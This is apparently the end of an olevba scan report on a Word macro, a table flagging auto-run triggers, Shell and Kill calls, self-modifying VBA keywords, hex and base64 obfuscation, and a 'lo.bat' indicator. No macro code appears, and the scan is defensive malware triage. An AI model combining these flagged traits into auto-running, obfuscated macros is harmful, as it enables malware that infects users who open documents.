|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

